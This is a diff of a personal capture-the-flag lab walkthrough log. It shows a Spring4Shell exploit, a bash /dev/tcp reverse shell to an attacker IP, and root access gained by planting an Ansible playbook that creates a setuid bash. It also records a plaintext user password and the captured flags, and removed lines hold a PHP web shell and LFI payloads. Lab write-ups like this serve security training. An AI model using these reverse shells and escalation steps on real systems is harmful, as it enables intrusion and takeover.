@@ -14,7 +14,7 @@
 
 //Flags:
 #User: 		878307b5d29fdc74fffcd96f4786402e
-#System:
+#System:	e8e71e4922358d5336a34505a3d13371
 
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -476,6 +476,7 @@ uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
 
 //SUCCESS
 
+//Get FLAG
 cat user.txt                  
 //878307b5d29fdc74fffcd96f4786402e
 
@@ -594,85 +595,132 @@ chmod +x pspy64
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
-//Create my own playbook ANSIBLE to run as root
+#############################
+#### BREAK
+##############################
+
+2023-04-12 19:16:06 CDT -- BACK
+
+// GET BACK IN
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-12 19:18:00 CDT -- 
+//Starts a RevShell on port 6969
+python3 ./spring4shell.py -u "http://10.10.11.204:8080"
+
+//SUCCESS
+
+
+//-- upgrade shell --
+//Catching 443 in another terminal
+sudo rlwrap -cAr nc -lvnp 443
+
+2023-04-12 19:20:53 CDT -- 
+/bin/bash -i >& /dev/tcp/10.10.16.4/443 0>&1
+
+//SUCCESS
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+// phil:DocPhillovestoInject123
+su - phil
+
+id
+uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
+
+//SUCCESS
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Ansible Playbook PrivEsc
+// https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/
 // https://gtfobins.github.io/gtfobins/ansible-playbook/
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+find / -xdev -type f -group staff 2>/dev/null
 
-2023-04-15 02:51:57 CDT -- 
-hak=$(touch letmein.yml)
-echo '[{hosts: localhost, tasks: [shell: /bin/bash -i >& /dev/tcp/10.10.16.7/443 0>&1]}]' > $hak
-sudo ansible-playbook $TF
+//Access to ansible_parallel-2021.1.22 package
 
-// Download file to edit it
+find / -xdev -type d -group staff 2>/dev/null
 
-//EDIT file
+//Interesting directories owned by staff
+/opt/automation/tasks
+/root
+
+drwx------   6 root staff 4.0K Mar  6 13:15 root
+
+2023-04-12 19:35:05 CDT -- 
+ls -lah /opt/automation/tasks
+
+total 12K
+drwxrwxr-x 2 root staff 4.0K Apr 16 00:08 .
+drwxr-xr-x 3 root root  4.0K Oct 20 04:23 ..
+-rw-r--r-- 1 root root   150 Apr 16 00:08 playbook_1.yml
+
+2023-04-12 19:36:16 CDT -- 
+cat /opt/automation/tasks/playbook_1.yml
 - hosts: localhost
-  tasks: 
-  - name: LETMEIN
-    [shell: bash -c 'bash -i >& /dev/tcp/10.10.16.7/443 0>&1']
-	become: true
-
-- hosts: localhost
-  connection: local
   tasks:
-    - name: "LET_ME_IN"
-      shell: "bash -c 'bash -i >& /dev/tcp/10.10.16.7/443 0>&1'"
-      become: true
+  - name: Checking webapp service
+    ansible.builtin.systemd:
+      name: webapp
+      enabled: yes
+      state: started
 
+//BASed on the pspy results from last night
 
-- hosts: localhost
-  connection: local
-  tasks:
-    - name: "LET_ME_IN"
-      shell: "cp /bin/bash /tmp/clippy2/bash && chmod +s /tmp/clippy2/bash"
-      become: tru
+//Of interest
+/usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml 
+/bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
+/bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
 
-//Set Temp directory
-TF=$(mktemp)
+//The job first runs /opt/automation/tasks/playbook_1.yml
+//Sleep for 10 secs, clears out /opt/automation/tasks/ then copies a fresh copy of playbook_1.yml to /opt/automation/tasks/
+//Last: /usr/local/bin/ansible-parallel runs ANY *.yml file in /opt/automation/tasks/ as ROOT
 
-- name: "LET_ME_IN"
-  hosts: localhost
-  connection: local
-  tasks:
-    - name: "LET_ME_IN"
-      shell: "cp /bin/bash $TF && chmod +s $TF"
-      become: true
+mktemp -d
+/tmp/tmp.PtDOIZjCS4
 
-//Start Listener
 sudo python3 -m http.server 80
 
-//UPload file
-wget http://10.10.16.7:80/letmein.yml
+wget http://10.10.16.4:80/letmein.yml
 
-//WAIT
+//Wait for Ansible job to run
 
+ls -lah /tmp/tmp.PtDOIZjCS4
+
+total 1.2M
+drwx------  2 phil phil 4.0K Apr 16 00:52 .
+drwxrwxrwt 16 root root  12K Apr 16 00:52 ..
+-rwsr-sr-x  1 root root 1.2M Apr 16 00:52 bash
+
+2023-04-12 20:19:13 CDT -- 
+/tmp/tmp.PtDOIZjCS4/bash -p
+
+id
+uid=1001(phil) gid=1001(phil) euid=0(root) egid=0(root) groups=0(root),50(staff),1001(phil)
+
+//SUCCESS
+
+//Get Flag
+cat /root/root.txt
+//e8e71e4922358d5336a34505a3d13371
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
-
-
-
-
-
-// MISC
-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-
-// ../../../../../../../var/www/WebApp/src/main/uploads 
-
-curl -k http://10.10.11.204:8080/show_image?page=php://filter/convert.base64-encode/resource=config
-
-<?php system($_GET[cmd]); ?>
-http://10.10.11.204:8080/show_image?img=zip://command.zip%23shell&cmd=whoami`
-
-../../../../../../../var/www/WebApp/src/main/uploads
-
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
-
-
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
+2023-04-12 20:31:33 CDT -- COMPLETE
 
